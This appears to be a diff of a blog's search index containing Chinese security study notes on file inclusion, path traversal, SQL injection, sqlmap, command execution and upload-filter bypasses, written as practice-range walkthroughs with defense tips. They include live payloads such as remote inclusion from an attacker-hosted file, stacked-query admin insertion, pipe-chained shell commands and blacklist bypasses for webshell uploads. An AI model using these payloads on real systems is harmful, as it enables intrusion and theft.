@@ -226,6 +226,7 @@ Q9：CORS跨域漏洞是什么？CORS 跨域漏洞的产生原因是因为没有
 白盒：代码审计查看include&#x2F;include_once&#x2F;require&#x2F;require_once参数是否可控
 黑盒：手工观察URL文件参数、漏洞扫描工具、公开POC测试
 
+
 二、本地包含 &amp; 远程文件包含1. 本地文件包含（LFI）仅读取服务器本地已有文件，常搭配文件上传使用
 (1) 无后缀拼接限制服务端代码1.php
 &lt;?php$filename=$_GET[&#x27;filename&#x27;];include ( $filename);?&gt;
@@ -255,6 +256,7 @@ txt文件被PHP解析执行。
 
 方式1：?filename=http://192.168.0.13:88/1.txt?问号作为URL参数，.html变成无效参数被忽略
 方式2：?filename=http://192.168.0.13:88/1.txt%23%23是#，注释掉后面拼接的.html (%00 截断也可以）
+
 
 三、PHP常用伪协议PHP伪协议(PHP Protocol Override)是一种在PHP处理数据时，通过替换数据报的头部信息来欺骗网络协议的方式来提高性能的技术。
 
@@ -350,6 +352,7 @@ http://localhost/include/upload.php?filename=http://192.168.0.13:88/1.txt
 5、data:&#x2F;&#x2F;协议（内嵌PHP代码执行）两种写法：
 ?filename=data://text/plain,&lt;?php phpinfo();?&gt;?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
 
+
 四、不安全文件下载漏洞1. 原理
 本质：受信越界，这是一种输入验证不严格导致的越界访问漏洞。正常情况下，应用只允许用户下载特定的目录（如&#x2F;uploads）下的公开资源，但由于程序直接信任了用户输入的路径或文件名，导致攻击者可以通过构造特殊的字符，跳出原本设定的储存边界，访问并下载服务器上任意可读的文件。
 核心机制：漏洞实现完全依赖于路径穿越（或目录跳转）。在操作系统中，..&#x2F;(Unix&#x2F;Linux)或..(Windows)代表返回上一级目录。当应用吧用户输入的参数直接拼接到服务器的文件查找路径中时，攻击者利用连续的..&#x2F;..&#x2F;..&#x2F;..&#x2F;,就可以一层一层脱离网站根目录，最终定位到系统的核心敏感文件。
@@ -357,6 +360,7 @@ http://localhost/include/upload.php?filename=http://192.168.0.13:88/1.txt
 2. Pikachu靶场实操
 下载链接原地址：http://xxx/vul/unsafedownload/execdownload.php?filename=smallane.png
 利用目录穿越payload：http://xxx/vul/execdownload.php?filename=../../../inc/config.inc.php直接下载网站数据库配置等敏感源码。
+
 
 五、补充文件下载与文件包含原理相近：
 
@@ -628,7 +632,6 @@ ORDER BY 1;ORDER BY 2;-- 不报错代表存在，报错即为最大列数
 SELECT 字段1, 字段2 FROM 表名;SELECT * FROM 表名 LIMIT 0, 1;
 
 
-
 本文为个人学习笔记，如有错误或疏漏，欢迎批评指正。
 
 ]]></content>
@@ -645,6 +648,7 @@ SELECT 字段1, 字段2 FROM 表名;SELECT * FROM 表名 LIMIT 0, 1;
     <url>/2026/05/23/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index/</url>
     <content><![CDATA[1. 什么是 SQL 注入SQL注入是一种常见的网络安全漏洞和攻击方式，它利用应用程序对用户输入数据的处理不当，使得攻击者能够在执行SQL查询时插入恶意的SQL代码。通过成功注入恶意代码，攻击者可以执行未经授权的数据库操作，获取敏感信息、篡改数据甚至完全破坏数据库。
 SQL 注入就是：有人在网站的输入框（比如登录框、搜索框）里，不是输正常内容，而是偷偷塞一段 SQL 数据库命令，想骗数据库执行，达到偷数据、删数据甚至改网站的目的。
+
 2. SQL 注入分类常见的注入点：
 ?str=xxx?test=xxx?idstr=xxx?id=xxx
 
@@ -959,7 +963,6 @@ b. 逐字符猜字段
 位数：字符串截取位置
 sleep (5)：条件成立延迟 5 秒响应
 
-
 2.5 DNSlog 盲注2.5.1 概念DNSlog盲注就是通过load_file函数发起请求，然后去DNSlog平台接收数据，需要用到load_file函数，就是需要用到root用户读写文件的功能。
 2.5.2 查看配置show VARIABLES like &#x27;secure_file_priv&#x27;
 
@@ -1022,6 +1025,7 @@ admin&#39;#的密码没变，修改的是admin的密码
 
 ?id=2;insert into users (name,password) values(&#x27;admin&#x27;,md5(&#x27;admin&#x27;));
 
+
 3. SQLMap工具运用
 官⽹：https://sqlmap.org/
 作⽤： sqlmap是⼀个开源的渗透测试⼯具，它可以⾃动化检测和利⽤SQL注⼊漏洞并接管数据库服务器。它有⼀个强⼤的检测引擎，许多适合于终极渗透测试的良好特性和众多的操作选项。注意：kali⾃带
@@ -1029,6 +1033,7 @@ admin&#39;#的密码没变，修改的是admin的密码
 3.1 常用命令//检测漏洞sqlmap -u &#x27;http://xxx?id=2&#x27;//查询当前数据库sqlmap -u &#x27;url&#x27; --current-db//查当前库有哪些表名sqlmap -u &#x27;url&#x27; -D 库名 --tables//某表有哪些字段sqlmap -u &#x27;url&#x27; -D 库名 -T 表名 --columns//列出数据sqlmap -u &#x27;url&#x27; -D 库名 -T 表名 -C 字段 --dump//其他：//执行sqlsqlmap -u &#x27;url&#x27; --sql-shell//执行系统命令sqlmap -u &#x27;url&#x27; --os-shell//读取文件sqlmap -u &#x27;url&#x27; --file-read &quot;d:/e.txt&quot;
 
 3.2 绕过WAFsqlmap -u &#x27;url&#x27; --tamper=passdog.py
+
 
 4. SQL注入绕过4.1 提交方式更改GET 改 POST
 安全狗（WAF 防御）
@@ -1045,10 +1050,10 @@ admin&#39;#的密码没变，修改的是admin的密码
 数据库权限控制、敏感数据加密
 预编译（参数化查询）
 
+
 6. 总结
 报错注入是在 union 注入在查询不到的情况下，才使用
 在使用报错注入的时候要关注报错注入的函数extractvalue()、updatexml()
-
 
 
 本文为个人学习笔记，如有错误或疏漏，欢迎批评指正。
@@ -1101,8 +1106,8 @@ http://localhost/2.php?x=ipconfig
 
 http://localhost/2.php?x=whoami
 
-二、墨者学院靶场https://mozhe.cn/
 
+二、墨者学院靶场https://mozhe.cn/
 案例1：Ping命令注入（靶场：https://mozhe.cn/bug/detail/12）
 
 
@@ -1139,7 +1144,6 @@ Burp抓包修改POST参数：iipp=127.0.0.1|ls&amp;submit=Ping，|为命令拼�
 
 注：命令分隔符有|、||、&amp;、&amp;&amp;、;
 
-
 案例2 PHP反引号命令执行（靶场：https://mozhe.cn/bug/detail/13）
 
 
@@ -1164,7 +1168,6 @@ payload1：?a=ls 列出当前目录，发现key文件。
 
 
 payload2：?a=cat&lt;key_5358811711226.php 读取key内容。
-
 
 
 
@@ -1204,7 +1207,6 @@ old=test|cat /key.txt 读取根目录key
 
 
 获取 cookie
-
 
 
 
@@ -1255,10 +1257,12 @@ POST传参：1=phpinfo();，触发eval执行代码。
 
 
 
+
 三、RCE漏洞防御方案
 危险函数入参做严格黑名单&#x2F;白名单过滤，过滤| &amp; ; $ &gt; &lt;等命令拼接符号。
 尽量避免使用eval、system、exec、shell_exec、``反引号等高危执行函数。
 若业务必须使用命令执行函数，采用escapeshellarg&#x2F;escapeshellcmd对输入转义过滤。
+
 
 四、总结Q1：命令执行漏洞是什么？分别叫什么？remote command execution 远程命令执行
 remote code execution 远程代码执行
@@ -1649,7 +1653,6 @@ POST 传参：如果路径拼接在 HTTP 请求体（Body）中，由于 POST �
 原理：开发者允许用户以数组形式（如 save_name[]）提交文件名，并在后端根据数组索引来拼接最终的文件名。如果代码逻辑中使用了 count() 函数获取数组长度，但拼接时却写死了索引（如 $save_name[0] . &#39;.&#39; . $save_name[count-1]），就会产生逻辑漏洞。
 绕过方法：抓包修改请求，构造一个不连续的数组：save_name[0]=shell.php，save_name[2]=jpg。此时数组长度 count 为 2。拼接时取 $save_name[0] (shell.php) 和 $save_name[1] (由于跳过了1，为空)，最终保存的文件名变成了 shell.php.，利用 Windows 特性去除末尾点，落地为 PHP。
 
-
 16. 中间件解析漏洞原理与绕过
 IIS 6.0 解析漏洞：
 目录解析原理：IIS 会将以 .asp 命名的文件夹（如 /test.asp/）下的所有文件都当成 ASP 脚本解析。
@@ -1667,7 +1670,6 @@ Nginx 解析漏洞 (CGI-PHP)：
 三、案例分析练习靶场：https://github.com/c0ny1/upload-labs
 上传的文件用到的一句话木马都是：
 &lt;?php  phpinfo();?&gt;
-
 
 Pass-01-前端校验1、题目
 
@@ -1696,7 +1698,6 @@ function checkFile() &#123;    var file = document.getElementsByName(&#x27;uploa
 
 
 访问
-
 
 
 
@@ -1729,7 +1730,6 @@ $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    
 访问：
 
 http://127.0.0.1/upload/1.php
-
 
 
 
@@ -1778,7 +1778,6 @@ trim() 首尾去空格
 访问
 
 http://127.0.0.1/upload/202606052009002725.phtml
-
 
 
 
@@ -1845,7 +1844,6 @@ http://127.0.0.1/upload/loudong.jpg
 
 
 
-
 Pass-05-大写1、题目
 
 $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空        if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件类型不允许上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
@@ -1874,7 +1872,6 @@ http://127.0.0.1/upload/202606052057142902.PHP
 
 
 
-
 Pass-06-空格1、题目
 
 $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA                if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            if (move_uploaded_file($temp_file,$img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件不允许上传&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
@@ -1895,7 +1892,6 @@ $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    
 
 2. 访问：
 http://127.0.0.1/upload/202606052108019520.php
-
 
 
 
@@ -1920,7 +1916,6 @@ $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    
 访问：
 
 http://127.0.0.1/upload/1.php.
-
 
 
 
@@ -1954,14 +1949,12 @@ http://127.0.0.1/upload/202606052118232914.php
 
 
 
-
 Pass-09- 点 + 空格 + 点 + 空格1、题目
 
 $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#x27;.&#x27;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空                if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125; else &#123;            $msg = &#x27;此文件类型不允许上传！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
 
 2、解题思路
 分析代码：和 Pass-04 的区别就是这一关无法用.htaccess配置文件，所以可以使用 Pass-04 的方法二，这里就不再赘述。
-
 
 Pass-10- 双写1、题目
 
@@ -1994,7 +1987,6 @@ http://127.0.0.1/upload/1.php
 
 
 
-
 Pass-11-%00 截断1、题目
 
 2、解题思路
@@ -2023,7 +2015,6 @@ http://127.0.0.1/upload/1.php
 
 
 因为我们使用了%00 截断，因此 jpg 图片根本就不存在
-
 Pass-12-%00 截断1、题目
 
 2、解题思路和 Pass11 的区别在于，Pass12 对文件的保存路径是 $_POST[‘save_path’]   
@@ -2033,7 +2024,6 @@ Pass-12-%00 截断1、题目
 修改文件后缀，在 php 后面加上%00.jpg
 查看响应，文件上传成功
 访问 1.php（不能包含用于截断的部分）
-
 
 
 
@@ -2079,7 +2069,6 @@ http://127.0.0.1/include.php?file=upload/5120260603104828.png
 
 
 
-
 Pass-14-图片马1、题目
 
 
@@ -2122,7 +2111,6 @@ http://127.0.0.1/include.php?file=upload/3520260603113051.png
 
 
 
-
 Pass-15-图片马1、题目
 
 
@@ -2151,7 +2139,6 @@ exif_imagetype() 只检查文件头的前几个字节
 访问
 
 http://127.0.0.1/include.php?file=upload/1220260603114237.png
-
 
 
 
@@ -2252,7 +2239,6 @@ http://127.0.0.1/upload/info.php
 
 
 
-
 Pass-18-解析漏洞1、题目
 
 //index.php$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;]))&#123;    require_once(&quot;./myupload.php&quot;);    $imgFileName =time();    $u = new MyUpload($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;size&#x27;],$imgFileName);    $status_code = $u-&gt;upload(UPLOAD_PATH);    switch ($status_code) &#123;        case 1:            $is_upload = true;            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;            break;        case 2:            $msg = &#x27;文件已经被上传，但没有重命名。&#x27;;            break;         case -1:            $msg = &#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;;            break;         case -2:            $msg = &#x27;上传失败，上传目录不可写。&#x27;;            break;         case -3:            $msg = &#x27;上传失败，无法上传该类型文件。&#x27;;            break;         case -4:            $msg = &#x27;上传失败，上传的文件过大。&#x27;;            break;         case -5:            $msg = &#x27;上传失败，服务器已经存在相同名称文件。&#x27;;            break;         case -6:            $msg = &#x27;文件无法上传，文件不能复制到目标目录。&#x27;;            break;              default:            $msg = &#x27;未知错误！&#x27;;            break;    &#125;&#125;//myupload.phpclass MyUpload&#123;..................   var $cls_arr_ext_accepted = array(      &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,      &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );..................    /** upload()   **   ** Method to upload the file.   ** This is the only method to call outside the class.   ** @para String name of directory we upload to   ** @returns void  **/  function upload( $dir )&#123;        $ret = $this-&gt;isUploadedFile();        if( $ret != 1 )&#123;      return $this-&gt;resultUpload( $ret );    &#125;    $ret = $this-&gt;setDir( $dir );    if( $ret != 1 )&#123;      return $this-&gt;resultUpload( $ret );    &#125;    $ret = $this-&gt;checkExtension();    if( $ret != 1 )&#123;      return $this-&gt;resultUpload( $ret );    &#125;    $ret = $this-&gt;checkSize();    if( $ret != 1 )&#123;      return $this-&gt;resultUpload( $ret );        &#125;        // if flag to check if the file exists is set to 1        if( $this-&gt;cls_file_exists == 1 )&#123;            $ret = $this-&gt;checkFileExists();      if( $ret != 1 )&#123;        return $this-&gt;resultUpload( $ret );          &#125;    &#125;    // if we are here, we are ready to move the file to destination    $ret = $this-&gt;move();    if( $ret != 1 )&#123;      return $this-&gt;resultUpload( $ret );        &#125;    // check if we need to rename the file    if( $this-&gt;cls_rename_file == 1 )&#123;      $ret = $this-&gt;renameFile();      if( $ret != 1 )&#123;        return $this-&gt;resultUpload( $ret );          &#125;    &#125;        // if we are here, everything worked as planned :)    return $this-&gt;resultUpload( &quot;SUCCESS&quot; );    &#125;.................. &#125;;
@@ -2292,7 +2278,6 @@ pass-18 和 pass-17 的区别在于，pass-17 是先移动，再校验；而 pas
 访问
 
 http://127.0.0.1/upload/info.php.7z或者http://127.0.0.1/uploadinfo.php.7z
-
 
 
 
@@ -2350,7 +2335,6 @@ http://127.0.0.1/upload/upload-19.php
 
 
 
-
 Pass-20-白名单1、题目
 
 $is_upload = false;$msg = null;if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123;    //检查MIME    $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;);    if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123;        $msg = &quot;禁止上传该类型文件!&quot;;    &#125;else&#123;        //检查文件名        $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;];        if (!is_array($file)) &#123;            $file = explode(&#x27;.&#x27;, strtolower($file));        &#125;        $ext = end($file);        $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);        if (!in_array($ext, $allow_suffix)) &#123;            $msg = &quot;禁止上传该后缀文件!&quot;;        &#125;else&#123;            $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $msg = &quot;文件上传成功！&quot;;                $is_upload = true;            &#125; else &#123;                $msg = &quot;文件上传失败！&quot;;            &#125;        &#125;    &#125;&#125;else&#123;    $msg = &quot;请选择要上传的文件！&quot;;&#125;
@@ -2405,7 +2389,6 @@ http://127.0.0.1/upload/upload-20.php
 # 1. 更新软件源sudo apt update# 2. 安装 Docker、Docker-Compose 和 Gitsudo apt install docker.io docker-compose git -y# 3. 启动并设置 Docker 开机自启sudo systemctl start dockersudo systemctl enable docker
 
 # 下载 Vulhub 仓库git clone https://github.com/vulhub/vulhub.git
-
 
 1. IIS6解析漏洞IIS6.0使用Windows2003系统
 (1) IIS6.0解析漏洞介绍
